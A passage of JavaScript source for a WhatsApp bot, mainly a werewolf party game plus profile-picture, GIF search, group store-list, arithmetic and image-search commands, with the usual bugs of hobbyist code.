    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    Dare.werewolf = Dare.werewolf ? Dare.werewolf : {};
    const ww = Dare.werewolf ? Dare.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return m.reply("The group is still in the game session");
        if (playerOnGame(sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await m.reply("The room has been successfully created, type *.ww join* to join");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return m.reply("There are no gaming sessions yet");
        if (ww[chat].status === true)
            return m.reply("The game session has started");
        if (ww[chat].player.length > 16)
            return m.reply("Sorry, the number of players is full");
        if (playerOnRoom(sender, chat, ww) === true)
            return m.reply("You have joined this room");
        if (playerOnGame(sender, ww) === true)
            return m.reply("You are still in a game session");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nThe minimum number of players is 5 and the maximum is 15";
        Dare.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return m.reply("There are no gaming sessions yet");
        if (ww[chat].player.length === 0)
            return m.reply("The room doesn't have any players yet");
        if (ww[chat].player.length < 5)
            return m.reply("Sorry, the number of players does not meet the requirements");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You haven't joined this room yet");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(Dare, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(Dare, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(Dare, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return m.reply("The game session has started");
        if (ww[chat].owner !== sender)
            return m.reply(
                `only @${ww[chat].owner.split("@")[0]} which can start the game`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Wagwan ${Dare.getName(
              ww[chat].player[i].id
            )}, You have been chosen to play a *Werewolf* ${emoji_role(
              "werewolf"
            )} In this game, please choose one of the players you want to eat tonight\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill number* to kill the player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `To kill players ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Click here!",
                      sections,
                      mentions: player,
                    };
                    await Dare.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await Dare.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nWagwan ${Dare.getName(
              ww[chat].player[i].id
            )} Your role is *Village Resident* ${emoji_role(
              "inhabitant"
            )}, Stay alert, maybe a *Werewolf* will eat you tonight, please go to your respective homes.\n*LIST PLAYER*:\n${list1}`;
                    await Dare.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Wagwan ${Dare.getName(
              ww[chat].player[i].id
            )} You have been chosen to be a *Seeker* ${emoji_role(
              "seer"
            )}. With the magic you have, you can find out the role of the player you choose.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy number* to see the role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Check Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `To see the player's identity ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Click here!",
                       sections,
                       mentions: player,
                     };
                     await Dare.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await Dare.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Wagwan ${Dare.getName(
              ww[chat].player[i].id
            )} You were chosen to play the *Guardian Angel* ${emoji_role(
              "guardian"
            )}, With the power you have, you can protect the citizens, please choose one player you want to protect\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff number* to protect players`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Protect Players ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `To protect players ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Click here!",
                      sections,
                      mentions: player,
                    };
                    await Dare.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await Dare.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Wagwan ${Dare.getName(
              ww[chat].player[i].id
            )} You were chosen as a Wizard ${emoji_role(
              "sorcerer"
            )}, With the power you have, you can reveal the identities of the players, please select 1 person whose identity you want to reveal\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer number* to see the player role`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Check Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `To see the player's identity ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Click here!",
                      sections,
                      mentions: player,
                    };
                    await Dare.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await Dare.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await Dare.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nThe game has started, the players will play their respective roles, please check the private chat to see your role. Be careful, residents, maybe tonight will be your last",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(Dare, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return m.reply("There are no gaming sessions yet");
        if (ww[chat].status === false)
            return m.reply("The game session has not started yeti");
        if (ww[chat].time !== "voting")
            return m.reply("The voting session has not yet started");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You're not a player");
        if (dataPlayer(sender, ww).isdead === true)
            return m.reply("You are dead");
        if (!target || target.length < 1)
            return m.reply("Enter the player number");
        if (isNaN(target)) return m.reply("Use only numbers");
        if (dataPlayer(sender, ww).isvote === true)
            return m.reply("You've already voted");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return m.reply(`Player ${target} is dead.`);
        if (ww[chat].player.length < parseInt(target))
            return m.reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return m.reply("Player not registered!");
        vote(chat, parseInt(target), sender, ww);
        return m.reply("🙂 Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return m.reply("No gaming sessions");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You are not in a gaming session");
        if (ww[chat].status === true)
            return m.reply("The game has started, you can't leave");
        m.reply(`@${sender.split("@")[0]} Exit the game`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return m.reply("No gaming sessions");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } which can delete this game session`
            );
        m.reply("The game session was successfully deleted").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return m.reply("No gaming sessions");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("You are not in a gaming session");
        if (ww[chat].player.length === 0)
            return m.reply("The game session does not have any players yet");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        Dare.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nSocial Games That Take Place Over Several Rounds. Players are required to look for a criminal in the game. The players are given their own time, roles and abilities to play this game\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nThis game can be played by 5 to 15 people.`;
        Dare.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
//==================================================================
case 'wwpc': {
let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

    const {
        sender,
        chat
    } = m;
    Dare.werewolf = Dare.werewolf ? Dare.werewolf : {};
    const ww = Dare.werewolf ? Dare.werewolf : {};
    const value = args[0];
    const target = args[1];

    if (playerOnGame(sender, ww) === false)
        return reply("You are not in a game session");
    if (dataPlayer(sender, ww).status === true)
        return reply(
            "Skill has been used, skill can only be used once per night"
        );
    if (dataPlayer(sender, ww).isdead === true)
        return reply("You are dead");
    if (!target || target.length < 1) return reply("Enter the player number");
    if (isNaN(target)) return reply("Use only numbers");
    let byId = getPlayerById2(sender, parseInt(target), ww);
    if (byId.db.isdead === true) return reply("Player is dead");
    if (byId.db.id === sender)
        return reply("Cannot use skills for yourself");
    if (byId === false) return reply("Player not registered");
    if (value === "kill") {
        if (dataPlayer(sender, ww).role !== "werewolf")
            return reply("This role is not for you");
        if (byId.db.role === "sorcerer")
            return reply("Cannot use skills for friends");
        return m
            .reply("Successfully killed the player " + parseInt(target))
            .then(() => {
                dataPlayer(sender, ww).status = true;
                killWerewolf(sender, parseInt(target), ww);
            });
    } else if (value === "dreamy") {
        if (dataPlayer(sender, ww).role !== "seer")
            return reply("This role is not for you");
        let dreamy = dreamySeer(m.sender, parseInt(target), ww);
        return m
            .reply(`Successfully unlocked the identity of player ${target} is ${dreamy}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    } else if (value === "deff") {
        if (dataPlayer(sender, ww).role !== "guardian")
            return reply("This role is not for you");
        return reply(`Successfully protected the player ${target}`)
        .then(() => {
            protectGuardian(m.sender, parseInt(target), ww);
            dataPlayer(sender, ww).status = true;
        });
    } else if (value === "sorcerer") {
        if (dataPlayer(sender, ww).role !== "sorcerer")
            return reply("This role is not for you");
        let sorker = sorcerer(sesi(m.sender), target);
        return m
            .reply(`Successfully unlocked player identity ${player} is ${sorker}`)
            .then(() => {
                dataPlayer(sender, ww).status = true;
            });
    }
}
break
//==================================================================
case 'setppbot1': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Dare.downloadAndSaveMediaMessage(quoted)
			let botNumber = await Dare.decodeJid(Dare.user.id)
			let { img } = await pepe(media)
			await Dare.query({
				tag: 'iq',
				attrs: {
					to: botNumber,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Successfully replaced PP Bot`)
		} catch (e) {
			console.log(e)
			reply(`An error occurred, try again later.`)
		}
	} else {
		reply(`Send pictures with captions *${command}* or tag images that have been sent`)
	}
}
break
//==================================================================
case 'setppgroup1': {
const jimp_1 = require('jimp')
async function pepe(media) {
	const jimp = await jimp_1.read(media)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
		preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
	}
}

	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await Dare.downloadAndSaveMediaMessage(quoted)
			let { img } = await pepe(media)
			await Dare.query({
				tag: 'iq',
				attrs: {
					to: m.chat,
					type:'set',
					xmlns: 'w:profile:picture'
				},
				content: [
					{
						tag: 'picture',
						attrs: { type: 'image' },
						content: img
					}
				]
			})
			reply(`Admin @${(m.sender || '').replace(/@s\.whatsapp\.net/g, '')} has changed the Icon Group!`, null, { mentions: [m.sender] })
		} catch (e) {
			console.log(e)
			reply(`An error occurred, try again later.`)
		}
	} else {
		reply(`Send pictures with captions *${command}* or tag images that have been sent`)
	}
}
break
//=========================================\\
case 'tenor': {
function isValidURL(message) {
    const urlPattern = /https?:\/\/[^\s/$.?#].[^\s]*/;
    return urlPattern.test(message);
}

async function getTemplateImageUrl(input, number) {
    try {
        const data = await (await fetch(`https://g.tenor.com/v1/search?q=${input}&key=LIVDSRZULELA`)).json();
        const selectedId = data.results[number - 1];
        return {
            one: selectedId,
            all: data.results
        };
    } catch (error) {
        console.error("Error fetching data:", error);
        return "Error fetching data.";
    }
}
    let [tema, urutan] = text.split(/[^\w\s]/g)
    if (!tema) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    if (!urutan) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    if (isNaN(urutan)) return m.reply("*Example:*\n.tenor [tema]|[angka]")
    await m.reply(mess.wait)
    try {
        let json = await getTemplateImageUrl(tema, urutan)
        let data = json.one
        let all = json.all
        if (urutan > all.length) return m.reply("Input query!\n*Example:*\n.tenor [tema]|[angka]\n\n*Select an existing number*\n" + all.map((item, index) => `*${index + 1}.* ${item.content_description}`).join("\n"))
        if (isValidURL(data.media[0].mp4.url)) {
            let caption = `🔍 *[ HASIL ]*

🆔 *ID:* ${data.id}
🌐 *URL:* ${data.url}
📋 *Description:* ${data.content_description}
📌 *Item:* ${data.itemurl}`
            await Dare.sendMessage(m.chat, {
                video: {
                    url: data.media[0].mp4.url
                },
                caption: caption,
                gifPlayback: true,
                gifAttribution: 2
            }, {
                quoted: m
            })
        }
    } catch (e) {
        await m.reply(eror)
    }
}
break

//===============Store-Menu================\\
case 'list': case 'store':{
if (db_respon_list.length === 0) return reply(`There is no message list in the database yet`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`There is no list of messages registered in this group yet`)
let teks = `Halo @${m.sender.split("@")[0]} The following is a list of what is currently available.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nTo view product details, please send the product name in the list above. For example, you want to see product details from ${db_respon_list[0].key.toUpperCase()}, then send a message ${db_respon_list[0].key.toUpperCase()} kepada bot`
Dare.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (db_respon_list.length === 0) return reply(`There is no message list in the database yet`)
if (!text) return reply(`use it by the way ${prefix + command} *key*\n\n_Example_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return reply(`Response list with key *${q}* not in database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
reply(`Successfully delete message list with key *${q}*`)
break
case 'addlist':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`use it by the way ${prefix+command} *key|response*\n\n_Example_\n\n${prefix+command} test|what`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return reply(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
let media = await Dare.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Successfully set list message with key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return reply(`use it by the way ${prefix+command} *key|response*\n\n_Example_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return reply(`Sorry, for the key *${args1}* Not yet registered in this group`)
if (/image/.test(mime)) {
let media = await Dare.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tambah':{
if (!text.includes('+')) return reply(`use it by the way ${prefix+command} *angka* + *angka*\n\n_Example_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!text.includes('-')) return reply(`use it by the way ${prefix+command} *angka* - *angka*\n\n_Example_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!text.includes('*')) return reply(`use it by the way ${prefix+command} *angka* * *angka*\n\n_Example_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!text.includes('/')) return reply(`use it by the way ${prefix+command} *angka* / *angka*\n\n_Example_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
reply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetProses(m.chat, set_proses)) return reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
reply(`🙂 Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
reply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (!isSetProses(m.chat, set_proses)) return reply(`There are no process sets in this gc yet`)
removeSetProses(m.chat, set_proses)
reply(`Successfully delete process set`)
break
case 'setdone':{
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} Done @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetDone(m.chat, set_done)) return reply(`I've set it done before`)
addSetDone(text, m.chat, set_done)
reply(`Successful set done!`)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (!text) return reply(`use it by the way ${prefix + command} *teks*\n\n_Example_\n\n${prefix + command} Done @user\n\n- @user (tag the person who ordered)\n- @order (order)\n- @hour (order time)\n- @date (order date) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
reply(`Successful change set done!`)
} else {
addSetDone(text, m.chat, set_done)
reply(`Successful change set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return reply('𝙶𝚁𝙾𝚄𝙿 𝙵𝙴𝙰𝚃𝚄𝚁𝙴𝚂!')
if (!isAdmins) return reply('Admin only feature!')
if (!isSetDone(m.chat, set_done)) return reply(`There is no set done yet on this GC`)
removeSetDone(m.chat, set_done)
reply(`Successfully delete set done`)
break
//=========================================\\	
case 'gptimg':
case 'bingimg': {
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply('Wheres the prompt, boss?...')
	try {
	  reply(mess.wait)
  let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
for (let bing of ini.result) {
await sleep(500)
await Dare.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
Dare.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
Dare.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
//=========================================\\	
case 'smeta': {
if (!/webp/.test(mime)) return replydare('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await Dare.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return replydare('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `𝘽.𝙈.𝘽 `)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) Dare.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return replydare('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
			case 'gimage': {
if (!text) return replydare(`Example : ${prefix + command} carry minati`)
reply(mess.wait)
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await Dare.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
Dare.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
Dare.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
        break
        
        case 'mediafire': {
	if (args.length == 0) return replydare(`Where is the link?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replydare(`The link you provided is invalid`)
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return replydare('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

